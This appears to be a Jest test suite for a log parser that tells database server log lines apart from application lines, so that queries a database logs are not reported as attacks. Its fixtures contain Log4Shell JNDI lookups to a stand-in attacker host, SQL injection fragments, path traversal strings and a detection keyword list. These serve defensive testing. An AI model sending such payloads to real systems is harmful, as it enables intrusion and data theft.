import { describe, expect, test } from "@jest/globals";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import {
  isClickHouseServerLine,
  isDatabaseServerJsonRecord,
  isDatabaseServerLogLine,
  isPostgresServerLine,
  skipContainerRuntimePrefix,
} from "../../../../Utils/SecurityEvent/LogParsers/DatabaseServerLogLine";
import SecurityDeviceLogParser from "../../../../Utils/SecurityEvent/LogParsers/SecurityDeviceLogParser";
import SecurityLogParser from "../../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
import SshLogParser from "../../../../Utils/SecurityEvent/LogParsers/SshLogParser";
import SudoLogParser from "../../../../Utils/SecurityEvent/LogParsers/SudoLogParser";
import WebAttackLogParser from "../../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import { FastestRun, fastestRun } from "../../../Helpers/FastestRun";
import { generatedTexts } from "../../../Helpers/GeneratedTexts";
import { WEB_LINES, logLine } from "./LogParserFixtures";

/*
 * A database server writes down the queries it runs, with whatever its
 * clients put in them: a log scan's search for "${jndi:", an application's
 * UNION ALL SELECT, a search for a sign-in line. So its own line is never
 * read for a security record (issue #6419: ClickHouse's error line for the
 * log scan's own failed query became a Log4Shell case "from" 26.7.38.18,
 * ClickHouse's version). These are real lines - ClickHouse 26.7 and
 * PostgreSQL 15 wrote them for this suite - and the shapes around them.
 */

// What every parser reads from a line, without the database server check in front.
function readByEachParser(body: string): Array<NormalizedSecurityEvent> {
  return [
    ...SecurityDeviceLogParser.parse(logLine(body)),
    ...SshLogParser.parse(logLine(body)),
    ...SudoLogParser.parse(logLine(body)),
    ...WebAttackLogParser.parse(logLine(body)),
  ];
}

function parse(body: string): Array<NormalizedSecurityEvent> {
  return SecurityLogParser.parse(logLine(body));
}

// The line of issue #6419, as ClickHouse 26.7.38.18 wrote it (the client's address hidden there as 10.x.x.x).
const CUSTOMER_LINE: string =
  "2026.11.08 09:12:44.512345 [ 812 ] {7f3c2a10-5b4e-4c1a-9d2f-6419aa001122} <Error> executeQuery: Code: 241. DB::Exception: (total) memory limit exceeded: would use 3.60 GiB (attempt to allocate chunk of 4.00 MiB bytes), current RSS: 3.21 GiB, maximum: 3.60 GiB. OvercommitTracker decision: Query was selected to stop by OvercommitTracker: While executing MergeTreeSelect(pool: ReadPool, algorithm: Thread). (MEMORY_LIMIT_EXCEEDED) (version 26.7.38.18 (official build)) (from [::ffff:10.42.0.17]:44220) (query 1, line 1) (in query: SELECT _id, time, body, attributes FROM oneuptime.LogItem WHERE (projectId = '0192f1a0-0000-7000-8000-000000006419') AND (time > '2026-11-08 09:07:44') AND (multiSearchAnyCaseInsensitive(body, _CAST(['failed password', 'accepted publickey', 'invalid user ', '; command=', 'union select', '../../', '${jndi:', '%24%7bjndi', '<script'], 'Array(String)'))) ORDER BY time ASC LIMIT 1000), Stack trace (when copying this message, always include the lines below):";

const CLICKHOUSE_LINES: Record<string, string> = {
  // ClickHouse 26.7.13.12, a failed query with its array parameter filled in.
  plainParameters:
    "2026.11.09 13:04:23.240838 [ 87 ] {fe9cb701-f25d-4f87-b54d-c190941a9c60} <Error> executeQuery: Code: 158. DB::Exception: Limit for rows or bytes to read exceeded, max rows: 1.00, current rows: 200.00 thousand: While executing MergeTreeSelect(pool: ReadPool, algorithm: Thread). (TOO_MANY_ROWS) (version 26.7.13.12 (official build)) (from 127.0.0.1:42742) (query 1, line 1) (in query: SELECT count() FROM probe_logs WHERE multiSearchAnyCaseInsensitive(body, _CAST(['${jndi:', 'union select', '../../'], 'Array(String)')) AND (body != 'probe-6419-plain')), Stack trace (when copying this message, always include the lines below):",
  // The same failure with the words sent in hex, as the scan sends them now.
  hexParameters:
    "2026.11.09 13:04:23.240838 [ 87 ] {fe9cb701-f25d-4f87-b54d-c190941a9c61} <Error> executeQuery: Code: 158. DB::Exception: Limit for rows or bytes to read exceeded, max rows: 1.00, current rows: 200.00 thousand: While executing MergeTreeSelect(pool: ReadPool, algorithm: Thread). (TOO_MANY_ROWS) (version 26.7.13.12 (official build)) (from 127.0.0.1:42742) (query 1, line 1) (in query: SELECT count() FROM probe_logs WHERE multiSearchAnyCaseInsensitive(body, [unhex('247b6a6e64693a'), unhex('756e696f6e2073656c656374'), unhex('2e2e2f2e2e2f')]) AND (body != 'probe-6419-hex')), Stack trace (when copying this message, always include the lines below):",
  // A server-side error outside a query: empty braces.
  emptyQueryId:
    "2026.11.09 12:25:25.350616 [ 87 ] {} <Error> TCPHandler: Code: 395. DB::Exception: Value passed to 'throwIf' function is non-zero: while executing 'FUNCTION throwIf(greater(count(), 0_UInt8) :: 1, 'union select 1 from ../../etc/passwd' :: 2) -> throwIf(greater(count(), 0_UInt8), 'union select 1 from ../../etc/passwd') UInt8 : 0'. (FUNCTION_THROW_IF_VALUE_IS_NON_ZERO), Stack trace (when copying this message, always include the lines below):",
  // Versions before query ids were logged.
  noQueryId:
    "2019.05.10 10:00:00.123456 [ 45 ] <Error> executeQuery: Code: 60, e.displayText() = DB::Exception: Table default.users doesn't exist. (version 19.5.3.8 (official build)) (from 203.0.113.9:51234) (in query: SELECT * FROM users WHERE name = '' union select password from accounts --'), Stack trace:",
  // Keeper and the server's other loggers write the same header.
  information:
    "2026.11.09 13:04:23.240838 [ 1 ] {} <Information> Application: Starting ClickHouse 26.7.13.12 (revision: 54502, git hash: 0000000000000000000000000000000000000000, build id: 0000) with ../../etc/clickhouse-server/config.xml",
  // A whole-second time, without its fraction.
  wholeSecond:
    "2026.11.09 13:04:23 [ 87 ] {q} <Warning> executeQuery: query was slow (in query: SELECT 1 WHERE x = '${jndi:ldap://attacker.example/x}')",
};

const POSTGRES_LINES: Record<string, string> = {
  // PostgreSQL 15, the official image's default log_line_prefix ('%m [%p] ').
  statementAfterError:
    '2026-11-09 13:10:14.575 UTC [88] STATEMENT:  SELECT "Monitor"."_id" FROM "Monitor" WHERE "Monitor"."projectId" = \'not-a-uuid\' AND "Monitor"."_id" IN (SELECT "monitorId" FROM "MonitorOwnerUser" WHERE "userId" = \'0192f1a0-0000-7000-8000-000000006419\' UNION ALL SELECT "monitorId" FROM "MonitorOwnerTeam" WHERE "teamId" IN (\'0192f1a0-0000-7000-8000-000000006420\'))',
  timedOutStatement:
    "2026-11-09 13:10:14.668 UTC [95] STATEMENT:  SET statement_timeout = '10ms'; SELECT pg_sleep(1) UNION SELECT pg_sleep(1)",
  injectionThatReachedTheDatabase:
    '2026-11-09 13:10:14.575 UTC [88] ERROR:  syntax error at or near "union select password from users --" at character 42',
  // log_min_duration_statement writes the parameters of a slow statement.
  slowStatementParameters:
    "2026-11-09 13:10:15.001 UTC [91] DETAIL:  parameters: $1 = 'Log4Shell exploit attempt: ${jndi:ldap://attacker.example/x}', $2 = '203.0.113.44'",
  // A search somebody ran for a sign-in line.
  searchedSignInLine:
    "2026-11-09 13:10:16.120 UTC [97] LOG:  statement: SELECT count(*) FROM imported_logs WHERE body LIKE '%sshd[2210]: Failed password for invalid user admin from 203.0.113.7 port 52314 ssh2%'",
  searchedSudoLine:
    "2026-11-09 13:10:16.120 UTC [97] LOG:  statement: SELECT * FROM audit WHERE line = 'Oct 19 10:00:01 web-03 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash'",
  // Debian's and Ubuntu's prefix ('%m [%p] %q%u@%d ').
  debianPrefix:
    '2026-11-09 13:10:14.575 UTC [88] app@oneuptime ERROR:  invalid input syntax for type uuid: "../../etc/passwd"',
  // Amazon RDS ('%t:%r:%u@%d:[%p]:').
  rdsPrefix:
    "2026-11-09 13:10:14 UTC:10.0.0.5(51234):app@oneuptime:[88]:STATEMENT:  SELECT * FROM t WHERE a = '' UNION SELECT secret FROM keys",
  // Google Cloud SQL ('%m [%p]: [%l-1] db=%d,user=%u ').
  cloudSqlPrefix:
    "2026-11-09 13:10:14.575 UTC [88]: [2-1] db=oneuptime,user=app STATEMENT:  SELECT * FROM t WHERE a = '' UNION SELECT secret FROM keys",
  // Azure Database for PostgreSQL ('%t-%c-').
  azurePrefix:
    "2026-11-09 13:10:14 UTC-6735a1b2.58-LOG:  statement: SELECT * FROM t WHERE a = '' UNION SELECT secret FROM keys",
  // A zone without a name.
  numericZone:
    "2026-11-09 18:40:14.575 +0530 [88] STATEMENT:  SELECT * FROM t WHERE a = '' UNION SELECT secret FROM keys",
  localZone:
    "2026-11-09 14:10:14.575 CET [88] STATEMENT:  SELECT * FROM t WHERE a = '' UNION SELECT secret FROM keys",
};

const JSON_LINES: Record<string, string> = {
  // ClickHouse's json log format (<formatting><type>json</type>).
  clickHouse:
    '{"date_time_utc":"2026-11-09T13:04:23Z","date_time":"1762693463.240838","thread_name":"TCPHandler","thread_id":"87","level":"Error","query_id":"fe9cb701-f25d-4f87-b54d-c190941a9c60","logger_name":"executeQuery","message":"Code: 158. DB::Exception: Limit for rows or bytes to read exceeded. (TOO_MANY_ROWS) (version 26.7.13.12 (official build)) (from 127.0.0.1:42742) (in query: SELECT count() FROM probe_logs WHERE multiSearchAnyCaseInsensitive(body, _CAST([\'${jndi:\', \'union select\'], \'Array(String)\')))","source_file":"src/Interpreters/executeQuery.cpp; void DB::logException(ContextPtr, QueryLogElement &, bool)","source_line":"227"}',
  // PostgreSQL 15's jsonlog, a client's statement.
  postgres:
    '{"timestamp":"2026-11-09 13:10:14.575 UTC","user":"postgres","dbname":"postgres","pid":88,"remote_host":"[local]","session_id":"6af1c636.58","line_num":1,"ps":"SELECT","session_start":"2026-11-09 13:10:14 UTC","vxid":"3/6","txid":0,"error_severity":"ERROR","state_code":"22P02","message":"invalid input syntax for type uuid: \\"not-a-uuid\\"","statement":"SELECT 1 FROM t WHERE a = \'\' UNION SELECT secret FROM keys","cursor_position":69,"application_name":"psql","backend_type":"client backend","query_id":0}',
  // PostgreSQL's jsonlog, a background process: no user, no client.
  postgresBackground:
    '{"timestamp":"2026-11-09 13:09:56.385 UTC","pid":1,"session_id":"6af1c624.1","line_num":4,"session_start":"2026-11-09 13:09:56 UTC","txid":0,"error_severity":"LOG","message":"database system is ready to accept connections","backend_type":"postmaster","query_id":0}',
  // A CloudNativePG instance's record of PostgreSQL's line.
  cloudNativePg:
    '{"level":"info","ts":"2026-11-09T13:10:14.575Z","logger":"postgres","msg":"record","logging_pod":"oneuptime-postgres-1","record":{"log_time":"2026-11-09 13:10:14.575 UTC","user_name":"app","database_name":"oneuptime","process_id":"88","connection_from":"10.42.0.17:51234","session_id":"6af1c636.58","session_line_num":"1","command_tag":"SELECT","session_start_time":"2026-11-09 13:10:14 UTC","virtual_transaction_id":"3/6","transaction_id":"0","error_severity":"ERROR","sql_state_code":"42601","message":"syntax error at or near \\"union\\"","query":"SELECT * FROM t WHERE a = \'\' UNION SELECT secret FROM keys","query_pos":"28","application_name":"app","backend_type":"client backend","query_id":"0"}}',
  // CloudNativePG's pgaudit record.
  cloudNativePgAudit:
    '{"level":"info","ts":"2026-11-09T13:10:14.575Z","logger":"pgaudit","msg":"record","logging_pod":"oneuptime-postgres-1","record":{"log_time":"2026-11-09 13:10:14.575 UTC","user_name":"app","database_name":"oneuptime","process_id":"88","error_severity":"LOG","sql_state_code":"00000","backend_type":"client backend","audit":{"audit_type":"session","statement_id":"1","substatement_id":"1","class":"READ","command":"SELECT","statement":"SELECT * FROM t WHERE a = \'\' UNION SELECT secret FROM keys","parameter":"<not logged>"}}}',
};

/*
 * Lines that are not a database server's, though they hold its shapes:
 * each is read as before, and is the attack it holds.
 */
const NOT_DATABASE_LINES: Record<string, string> = {
  // A request whose URL spells a whole ClickHouse line.
  urlSpellsClickHouseLine:
    '203.0.113.44 - - [09/Nov/2026:13:04:23 +0000] "GET /?q=2026.11.09%2013:04:23.240838%20[%2087%20]%20{}%20<Error>%20${jndi:ldap://attacker.example/x} HTTP/1.1" 404 0 "-" "curl/8.5.0"',
  // The header in the middle of an application's line.
  headerMidLine:
    "WARN rejected header X-Api-Version=2026.11.09 13:04:23.240838 [ 87 ] {} <Error> ${jndi:ldap://attacker.example/x} from 203.0.113.44 on /api/v1/orders",
  // An application's JSON line, with a ClickHouse record's fields and its own.
  jsonWithItsOwnFields:
    '{"level":"warn","thread_id":"1","query_id":"2","logger_name":"http","source_file":"server.js","message":"rejected header ${jndi:ldap://attacker.example/x}","client_ip":"203.0.113.44","path":"/api/v1/orders"}',
  // An application's JSON line that names its own logger "postgres".
  jsonCloudNativePgLookalike:
    '{"level":"info","ts":"2026-11-09T13:10:14.575Z","logger":"postgres","msg":"record","record":{"error_severity":"LOG"},"client_ip":"203.0.113.44","header":"${jndi:ldap://attacker.example/x}"}',
  // Python's asctime: a comma before the milliseconds, and no zone.
  pythonAsctime:
    "2026-11-09 13:10:14,575 ERROR:  rejected header X-Api-Version=${jndi:ldap://attacker.example/x} from 203.0.113.44",
  // A dot before the milliseconds, then a level where the zone would be.
  levelAfterTime:
    "2026-11-09 13:10:14.575 INFO ERROR:  rejected header X-Api-Version=${jndi:ldap://attacker.example/x} from 203.0.113.44",
  // A time and a zone, then a client's "ERROR:  " after a quote.
  clientSeverityAfterQuote:
    '2026-11-09 13:10:14 UTC INFO request client_ip=203.0.113.44 user_agent="x ERROR:  ${jndi:ldap://attacker.example/x}"',
  // A time and a zone, then a client's "ERROR:  " after a query string.
  clientSeverityAfterQueryString:
    "2026-11-09 13:10:14 UTC INFO GET /search?q=x ERROR:  ${jndi:ldap://attacker.example/x} from 203.0.113.44",
  // Logback's and log4j2's default: a thread where the zone would be.
  logback:
    "2026-11-09 13:10:14.575 [http-nio-8080-exec-1] WARN  c.e.Api - rejected header X-Api-Version=${jndi:ldap://attacker.example/x} from 203.0.113.44",
  // A time, then a syslog host name of capitals.
  syslogHostName:
    "2026-11-09 13:10:14 PROD sshd[2210]: Failed password for invalid user admin from 203.0.113.7 port 52314 ssh2",
  // Spring Boot's ISO time.
  springBoot:
    "2026-11-09T13:10:14.575Z  WARN 1 --- [nio-8080-exec-1] c.e.Api : rejected header X-Api-Version=${jndi:ldap://attacker.example/x} from 203.0.113.44",
  // A container runtime's prefix before an access log line.
  containerAccessLog:
    '2026-11-09T13:04:23.240838123Z stdout F 203.0.113.44 - - [09/Nov/2026:13:04:23 +0000] "GET /?x=${jndi:ldap://attacker.example/x} HTTP/1.1" 404 0 "-" "curl/8.5.0"',
  // A forged ClickHouse header on the line after a request, in one record.
  headerOnALaterLine:
    '203.0.113.44 - - [09/Nov/2026:13:04:23 +0000] "GET /?x=${jndi:ldap://attacker.example/x} HTTP/1.1" 404 0 "-" "curl/8.5.0"\n2026.11.09 13:04:23.240838 [ 87 ] {} <Error> executeQuery: x',
  // A ClickHouse-like header with a level ClickHouse never writes.
  unknownLevel:
    "2026.11.09 13:04:23.240838 [ 87 ] {} <Access> 203.0.113.44 GET /?x=${jndi:ldap://attacker.example/x}",
  // Digits where the thread id goes, but no closing bracket.
  unclosedThread:
    "2026.11.09 13:04:23.240838 [ 87 {} <Error> 203.0.113.44 GET /?x=${jndi:ldap://attacker.example/x}",
};

describe("DatabaseServerLogLine", () => {
  test("the line of issue #6419 is ClickHouse's own, and no parser makes an event of it", () => {
    expect(isDatabaseServerLogLine(CUSTOMER_LINE)).toBe(true);
    expect(parse(CUSTOMER_LINE)).toEqual([]);

    /*
     * Without the check the request parser reads the scan's own words as
     * an attack - though never from ClickHouse's version: the address it
     * names is the one after "from", the database's client.
     */
    const events: Array<NormalizedSecurityEvent> =
      readByEachParser(CUSTOMER_LINE);

    expect(events.length).toBeGreaterThan(0);

    for (const event of events) {
      expect(event.principalIp).not.toBe("26.7.38.18");
      expect(event.principalIp).toBe("10.42.0.17");
    }
  });

  test.each(Object.entries(CLICKHOUSE_LINES))(
    "ClickHouse's line (%s) is never read for a security record",
    (_name: string, line: string) => {
      expect(isClickHouseServerLine(line, 0)).toBe(true);
      expect(isDatabaseServerLogLine(line)).toBe(true);
      expect(parse(line)).toEqual([]);
    },
  );

  test("ClickHouse's lines would otherwise read as attacks", () => {
    expect(readByEachParser(CLICKHOUSE_LINES["plainParameters"]!).length).toBe(
      1,
    );
    expect(readByEachParser(CLICKHOUSE_LINES["emptyQueryId"]!).length).toBe(1);
    expect(readByEachParser(CLICKHOUSE_LINES["noQueryId"]!).length).toBe(1);
    // In hex the words are not in the line at all.
    expect(readByEachParser(CLICKHOUSE_LINES["hexParameters"]!)).toEqual([]);
  });

  test.each(Object.entries(POSTGRES_LINES))(
    "PostgreSQL's line (%s) is never read for a security record",
    (_name: string, line: string) => {
      expect(isPostgresServerLine(line, 0)).toBe(true);
      expect(isDatabaseServerLogLine(line)).toBe(true);
      expect(parse(line)).toEqual([]);
    },
  );

  test("PostgreSQL's lines would otherwise read as attacks, sign-ins and sudo", () => {
    for (const name of [
      "timedOutStatement",
      "injectionThatReachedTheDatabase",
      "slowStatementParameters",
      "searchedSignInLine",
      "searchedSudoLine",
      "rdsPrefix",
    ]) {
      expect({
        name,
        read: readByEachParser(POSTGRES_LINES[name]!).length,
      }).toEqual({ name, read: 1 });
    }
  });

  test("PostgreSQL's own lines with no query in them are its own too", () => {
    for (const line of [
      "2026-11-09 13:09:56.385 UTC [1] LOG:  starting PostgreSQL 15.19 (Debian 15.19-1.pgdg130+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit",
      "2026-11-09 13:10:14.668 UTC [95] ERROR:  canceling statement due to statement timeout",
      '2026-11-09 13:10:14.575 UTC [88] ERROR:  invalid input syntax for type uuid: "not-a-uuid" at character 69',
      "2026-11-09 13:10:14.575 UTC [88] HINT:  No operator matches the given name and argument types.",
      "2026-11-09 13:10:14.575 UTC [88] CONTEXT:  PL/pgSQL function f() line 3 at RAISE",
      '2026-11-09 13:10:14.575 UTC [88] FATAL:  password authentication failed for user "app"',
      '2026-11-09 13:10:14.575 UTC [88] DEBUG2:  autovacuum: processing database "oneuptime"',
    ]) {
      expect({ line, read: isDatabaseServerLogLine(line) }).toEqual({
        line,
        read: true,
      });
    }
  });

  test.each(Object.entries(JSON_LINES))(
    "a database server's JSON record (%s) is never read for a security record",
    (_name: string, line: string) => {
      expect(isDatabaseServerJsonRecord(line)).toBe(true);
      expect(isDatabaseServerLogLine(line)).toBe(true);
      expect(parse(line)).toEqual([]);
    },
  );

  test("a container runtime's prefix is read past", () => {
    const prefix: string = "2026-11-09T13:04:23.240838123Z stderr F ";

    expect(skipContainerRuntimePrefix(prefix + CUSTOMER_LINE)).toBe(
      prefix.length,
    );
    expect(skipContainerRuntimePrefix(CUSTOMER_LINE)).toBe(0);

    for (const line of [
      CUSTOMER_LINE,
      POSTGRES_LINES["timedOutStatement"]!,
      JSON_LINES["cloudNativePg"]!,
    ]) {
      expect(isDatabaseServerLogLine(prefix + line)).toBe(true);
      expect(
        isDatabaseServerLogLine("2026-11-09T13:04:23Z stdout P " + line),
      ).toBe(true);
      expect(parse(prefix + line)).toEqual([]);
    }

    // Not a runtime's prefix: no stream, an unknown tag.
    expect(
      skipContainerRuntimePrefix(
        "2026-11-09T13:04:23Z journal F " + CUSTOMER_LINE,
      ),
    ).toBe(0);
    expect(
      skipContainerRuntimePrefix(
        "2026-11-09T13:04:23Z stderr X " + CUSTOMER_LINE,
      ),
    ).toBe(0);
  });

  test("leading white space is read past, and an empty line is nobody's", () => {
    expect(isDatabaseServerLogLine("  \t" + CUSTOMER_LINE)).toBe(true);
    expect(isDatabaseServerLogLine("")).toBe(false);
    expect(isDatabaseServerLogLine("   ")).toBe(false);
    expect(isDatabaseServerLogLine(undefined as unknown as string)).toBe(false);
  });

  test.each(Object.entries(NOT_DATABASE_LINES))(
    "a line that only holds a database server's shapes (%s) is read as before",
    (_name: string, line: string) => {
      expect(isDatabaseServerLogLine(line)).toBe(false);
    },
  );

  test("those lines are still the attacks they hold, from the client's address", () => {
    const expected: Record<string, string> = {
      urlSpellsClickHouseLine: "203.0.113.44",
      headerMidLine: "203.0.113.44",
      pythonAsctime: "203.0.113.44",
      levelAfterTime: "203.0.113.44",
      clientSeverityAfterQueryString: "203.0.113.44",
      logback: "203.0.113.44",
      springBoot: "203.0.113.44",
      containerAccessLog: "203.0.113.44",
      headerOnALaterLine: "203.0.113.44",
      syslogHostName: "203.0.113.7",
    };

    for (const [name, ip] of Object.entries(expected)) {
      const events: Array<NormalizedSecurityEvent> = parse(
        NOT_DATABASE_LINES[name]!,
      );

      expect({
        name,
        count: events.length,
        ip: events[0]?.principalIp,
      }).toEqual({ name, count: 1, ip });
    }

    // The JSON lines and the quoted one are events too.
    for (const name of [
      "jsonWithItsOwnFields",
      "jsonCloudNativePgLookalike",
      "clientSeverityAfterQuote",
      "unknownLevel",
      "unclosedThread",
    ]) {
      expect({ name, count: parse(NOT_DATABASE_LINES[name]!).length }).toEqual({
        name,
        count: 1,
      });
    }
  });

  test("an application line in the fixtures is never taken for a database server's", () => {
    expect(isDatabaseServerLogLine(WEB_LINES.log4ShellInApplicationLog)).toBe(
      false,
    );
    expect(parse(WEB_LINES.log4ShellInApplicationLog)).toHaveLength(1);
  });

  test("ClickHouse's header is read exactly", () => {
    const tail: string = " executeQuery: x";

    // Each a header ClickHouse never writes.
    for (const header of [
      "2026.11.09 13:04:23.240838 [ 87 ] {} <Error>x",
      "2026.11.09 13:04:23.240838 [ 87 ] {} Error>",
      "2026.11.09 13:04:23.240838 [ 87 ] {} <error>",
      "2026.11.09 13:04:23.240838 [ ] {} <Error>",
      "2026.11.09 13:04:23.240838 [ x ] {} <Error>",
      "2026.11.09 13:04:23.240838 [ 87 ]{} <Error>",
      "2026.11.09 13:04:23.240838 [ 87 ] {} <Error",
      "2026.11.09 13:04:23. [ 87 ] {} <Error>",
      "2026.11.09 13:04 [ 87 ] {} <Error>",
      "2026-11-09 13:04:23.240838 [ 87 ] {} <Error>",
      "2026.11.9 13:04:23.240838 [ 87 ] {} <Error>",
      "2026.11.09T13:04:23.240838 [ 87 ] {} <Error>",
      `2026.11.09 13:04:23.240838 [ 87 ] {${"q".repeat(300)}} <Error>`,
      "2026.11.09 13:04:23.240838 [ 87 ] {unclosed <Error>",
    ]) {
      expect({
        header,
        read: isClickHouseServerLine(header + tail, 0),
      }).toEqual({ header, read: false });
    }

    // Each a header it does write.
    for (const level of [
      "Fatal",
      "Critical",
      "Error",
      "Warning",
      "Notice",
      "Information",
      "Debug",
      "Trace",
      "Test",
    ]) {
      expect(
        isClickHouseServerLine(
          `2026.11.09 13:04:23.240838 [ 87 ] {} <${level}>${tail}`,
          0,
        ),
      ).toBe(true);
    }

    expect(
      isClickHouseServerLine(
        "2026.11.09 13:04:23.240838123 [  87  ] {a:b c} <Debug> x",
        0,
      ),
    ).toBe(true);
  });

  test("PostgreSQL's prefix ends at its severity, and only at one", () => {
    for (const severity of [
      "DEBUG",
      "DEBUG1",
      "DEBUG5",
      "LOG",
      "INFO",
      "NOTICE",
      "WARNING",
      "ERROR",
      "FATAL",
      "PANIC",
      "DETAIL",
      "HINT",
      "QUERY",
      "CONTEXT",
      "LOCATION",
      "STATEMENT",
    ]) {
      expect(
        isPostgresServerLine(
          `2026-11-09 13:10:14.575 UTC [88] ${severity}:  x`,
          0,
        ),
      ).toBe(true);
    }

    for (const line of [
      // One space after the colon is not PostgreSQL's.
      "2026-11-09 13:10:14.575 UTC [88] ERROR: x",
      // A word that only ends with a severity.
      "2026-11-09 13:10:14.575 UTC [88] MYERROR:  x",
      "2026-11-09 13:10:14.575 UTC [88] error:  x",
      // Further past the zone than any prefix writes.
      `2026-11-09 13:10:14.575 UTC ${"[88] ".repeat(40)}ERROR:  x`,
      // Not a time PostgreSQL writes.
      "2026-11-09 13:10 UTC [88] ERROR:  x",
      "2026/11/09 13:10:14 UTC [88] ERROR:  x",
      "2026-11-09 13:10:14.575UTC [88] ERROR:  x",
      "2026-11-09 13:10:14. UTC [88] ERROR:  x",
      // Zones PostgreSQL never writes.
      "2026-11-09 13:10:14.575 UTCX [88] ERROR:  x",
      "2026-11-09 13:10:14.575 UTC1 [88] ERROR:  x",
      "2026-11-09 13:10:14.575 utc [88] ERROR:  x",
      "2026-11-09 13:10:14.575 + [88] ERROR:  x",
      "2026-11-09 13:10:14.575 +05x [88] ERROR:  x",
      // The severity after something a prefix never writes.
      '2026-11-09 13:10:14.575 UTC [88] "ERROR:  x',
      "2026-11-09 13:10:14.575 UTC [88] {ERROR:  x",
      "2026-11-09 13:10:14.575 UTC [88] $ERROR:  x",
      "2026-11-09 13:10:14.575 UTC [88] a=1&ERROR:  x",
      "2026-11-09 13:10:14.575 UTC [88] 'ERROR:  x",
      "2026-11-09 13:10:14.575 UTC [88] 100% ERROR:  x",
    ]) {
      expect({ line, read: isPostgresServerLine(line, 0) }).toEqual({
        line,
        read: false,
      });
    }

    // What follows the severity is the server's message, whatever it holds.
    expect(
      isPostgresServerLine(
        '2026-11-09 13:10:14.575 UTC [88] ERROR:  "x" ${jndi:ldap://a/b} ?&;%',
        0,
      ),
    ).toBe(true);
  });

  test("whatever a server's message holds, its line is its own", () => {
    const alphabet: ReadonlyArray<string> = [
      "${jndi:ldap://attacker.example/x}",
      "' union select password from users --",
      "../../etc/passwd",
      "Failed password for invalid user admin from 203.0.113.7 port 22 ssh2",
      " ; COMMAND=/bin/bash",
      "CEF:0|Vendor|Product|1|100|Blocked|10|src=203.0.113.9",
      '"',
      "{",
      "}",
      " ",
      ":  ",
      "ERROR:  ",
      "\n",
      "x",
      "203.0.113.44",
    ];
    const headers: ReadonlyArray<string> = [
      "2026.11.09 13:04:23.240838 [ 87 ] {fe9cb701} <Error> executeQuery: ",
      "2026.11.09 13:04:23.240838 [ 87 ] {} <Information> Application: ",
      "2026-11-09 13:10:14.575 UTC [88] STATEMENT:  ",
      "2026-11-09 13:10:14 UTC:10.0.0.5(51234):app@oneuptime:[88]:LOG:  ",
      "2026-11-09T13:04:23.240838123Z stderr F 2026-11-09 13:10:14.575 UTC [88] ERROR:  ",
    ];

    for (const message of generatedTexts(600, 6419, alphabet, 8)) {
      for (const header of headers) {
        const line: string = header + message;

        expect({ line, read: isDatabaseServerLogLine(line) }).toEqual({
          line,
          read: true,
        });
        expect(parse(line)).toEqual([]);
      }
    }
  });

  test("a server's header anywhere but at the start of a line makes nothing of it", () => {
    const alphabet: ReadonlyArray<string> = [
      "203.0.113.44 ",
      "GET /?q=",
      "WARN ",
      "x",
      " ",
      '"',
      "[",
      "2026.11.09 13:04:23.240838 [ 87 ] {} <Error> ",
      "2026-11-09 13:10:14.575 UTC [88] ERROR:  ",
      "\n",
    ];

    for (const start of ["a", "WARN ", "203.0.113.44 ", "[", '"', "-"]) {
      for (const text of generatedTexts(300, 6420, alphabet, 8)) {
        const line: string = start + text;

        expect({ line, read: isDatabaseServerLogLine(line) }).toEqual({
          line,
          read: false,
        });
      }
    }
  });

  test("400,000 characters of the shapes it reads take time in line with them", () => {
    const length: number = 400000;
    const lines: ReadonlyArray<string> = [
      // A query id that never closes.
      `2026.11.09 13:04:23.240838 [ 87 ] {${"q".repeat(length)}`,
      // Thread id digits, and spaces around them.
      `2026.11.09 13:04:23.240838 [${" ".repeat(length)}87${" ".repeat(length)}`,
      `2026.11.09 13:04:23.${"1".repeat(length)}`,
      // A prefix of colons and spaces, and one long word before a colon.
      `2026-11-09 13:10:14.575 UTC ${":  ".repeat(length / 3)}`,
      `2026-11-09 13:10:14.575 UTC ${"E".repeat(length)}:  x`,
      `2026-11-09 13:10:14.575 UTC [88] ERROR:  ${"x".repeat(length)}`,
      // JSON with the fields looked for, too long to parse.
      `{"logger_name":"x","error_severity":"x","q":"${"x".repeat(length)}"}`,
      `{"logger_name":"x",${'"a":1,'.repeat(length / 6)}"b":1}`,
      // A runtime's prefix that never ends.
      `2026-11-09T${"1".repeat(length)}`,
    ];

    const run: FastestRun<number> = fastestRun({
      run: (): number => {
        let read: number = 0;

        for (const line of lines) {
          read += isDatabaseServerLogLine(line) ? 1 : 0;
        }

        return read;
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
    expect(run.result).toBe(1);
  });
});
